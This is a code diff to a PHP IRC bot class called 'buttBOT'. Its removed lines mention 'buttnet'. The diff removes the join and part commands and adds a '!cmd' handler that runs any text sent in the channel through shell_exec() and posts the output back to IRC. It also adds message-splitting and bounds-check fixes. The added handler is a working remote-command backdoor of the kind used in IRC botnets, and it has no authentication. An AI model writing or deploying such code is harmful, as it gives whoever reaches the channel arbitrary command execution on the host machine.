@@ -49,7 +49,6 @@ class buttBOT {
         {
                 $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                 $this->send_data('NICK', $config['nick']);
-//		$this->join_channel($config['channel']);
         }
 
 
@@ -58,10 +57,6 @@ class buttBOT {
         function main($config)
         {             
                 $data = fgets($this->socket, 256);
-                //debug
-                echo nl2br($data);		
-                flush();
-
                 $this->buf = explode(' ', $data);
 
 
@@ -75,26 +70,32 @@ class buttBOT {
 			$this->join_channel($config['channel']);
 			$this->joined = true;
 		}
-
-                $command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);
-
+		$command = '';
+		if(count($this->buf) >= 4)
+		{
+              		$command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);
+		}
                 switch($command) 
                 {                      
-                        case ':!join':
-                                $this->join_channel($this->buf[4]);
+                        case ':!cmd':
+                                $message = "";
+				$cmd = "";
+                                for($i=4; $i < (count($this->buf)); $i++)
+                                {
+                                        $cmd .= $this->buf[$i]." ";
+                                }
+				$message = shell_exec(trim($cmd));
+				$message = preg_replace("/\r|\n|\r\n/", " <br> ", $message);
+				$this->send_data('PRIVMSG '.$this->buf[2].' :', $message);
                                 break;                     
-                        case ':!part':
-                                $this->send_data('PART '.$this->buf[4].' :', 'welcome to buttnet');
-                                break;   
                                                                  
                         case ':!say':
                                 $message = "";
-                                for($i=5; $i <= (count($this->buf)); $i++)
+                                for($i=4; $i < (count($this->buf)); $i++)
                                 {
                                         $message .= $this->buf[$i]." ";
                                 }
-                                
-                                $this->send_data('PRIVMSG '.$this->buf[4].' :', $message);
+                                $this->send_data('PRIVMSG '.$this->buf[2].' :', $message);
                                 break;                        		
                         
                 }
@@ -109,9 +110,16 @@ class buttBOT {
                 if($msg == null)
                 {
                         fputs($this->socket, $cmd."\r\n");
-                } else {
-
-                        fputs($this->socket, $cmd.' '.$msg."\r\n");
+                } elseif ($msg != null){
+			if(strlen($msg) >= 245) {
+				$msgArray = str_split($msg, 245);
+				foreach ($msgArray as $chunk) {
+                        		fputs($this->socket, $cmd.' '.$chunk."\r\n");
+				}
+			}
+			elseif(strlen($msg) < 245){
+                        	fputs($this->socket, $cmd.' '.$msg."\r\n");
+			}
                 }
 
         }
